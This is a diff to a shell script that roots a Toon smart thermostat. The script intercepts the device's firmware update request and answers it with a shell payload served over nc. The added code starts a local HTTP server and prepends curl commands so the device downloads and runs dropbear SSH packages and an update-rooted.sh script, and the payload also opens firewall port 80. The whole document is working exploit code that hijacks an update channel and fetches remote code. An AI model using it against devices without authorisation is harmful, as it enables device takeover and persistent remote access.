@@ -6,6 +6,8 @@ rm -f /tmp/pipe.out
 /sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
 killall -9 nc 2>/dev/null
 killall -9 cat 2>/dev/null
+# Kill any running HTTP servers
+pkill -f "python3 -m http.server 8000" 2>/dev/null
 
 #prepare payload to open port 80 on Toon so we can see logging on webserver
 PAYLOAD=$'#!/bin/sh\niptables -I HCB-INPUT -p tcp --dport 80 -j ACCEPT'
@@ -38,6 +40,18 @@ then
  clear
  echo ""
  echo "Rooting Toon"
+ # Start HTTP Server if we have a files directory
+ if [ -d "files" ]; then
+   echo "Setting up HTTP server to serve local files..."
+   (cd files && python3 -m http.server 8000) &
+   HTTP_SERVER_PID=$!
+   sleep 2
+   LOCAL_IP=$(hostname -I | awk '{print $1}')
+   echo "HTTP server started at http://$LOCAL_IP:8000"
+   
+   # We'll add commands to the payload later to download these files from our server
+ fi
+ 
  if [ -f "toon_payload" ]; then
    echo "Using local payload file"
    PAYLOAD="$PAYLOAD ; `cat toon_payload`"
@@ -136,11 +150,33 @@ do
     echo "Received valid update request."
     echo "Starting payload process in background."
     echo "-------------------------------------------------------"
+    
+    # Modify payload to download files from our HTTP server if available
+    if [ -d "files" ] && [ ! -z ${HTTP_SERVER_PID+x} ]; then
+      LOCAL_IP=$(hostname -I | awk '{print $1}')
+      # Prepend download commands to the payload
+      DOWNLOAD_COMMANDS="cd /tmp && "
+      if [ -f "files/dropbear_2015.71-r0_qb2.ipk" ]; then
+        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/dropbear_2015.71-r0_qb2.ipk -o dropbear_2015.71-r0_qb2.ipk && "
+      fi
+      if [ -f "files/dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk" ]; then
+        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk -o dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk && "
+      fi
+      if [ -f "files/update-rooted.sh" ]; then
+        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/update-rooted.sh -o update-rooted.sh && chmod +x update-rooted.sh && "
+      fi
+      
+      PAYLOAD="${DOWNLOAD_COMMANDS}${PAYLOAD}"
+      echo "Added commands to download files from http://$LOCAL_IP:8000"
+    fi
+    
+    echo "Final payload:"
     echo -e $PAYLOAD
     echo "-------------------------------------------------------"
+    
     timeout 80 bash -c "echo '$PAYLOAD' | nc -l -p 80 -q 2 " &
     PAYLOAD_PID=$!
-    echo "Sending the reponse for the upgrade request."
+    echo "Sending the response for the upgrade request."
     echo "-------------------------------------------------------"
     echo -e $TOSEND
     echo "-------------------------------------------------------"
@@ -165,6 +201,13 @@ echo "Depending on the firmware of the Toon this can take a minute or so."
 echo ""
 echo " .... Please wait......"
 echo ""
+
+# Kill the HTTP server once we're done with it
+if [ ! -z ${HTTP_SERVER_PID+x} ]; then
+  kill $HTTP_SERVER_PID 2>/dev/null
+  echo "HTTP server stopped"
+fi
+
 wait $PAYLOAD_PID
 SUCCESS=$?
 ip addr del $IP/32 dev lo
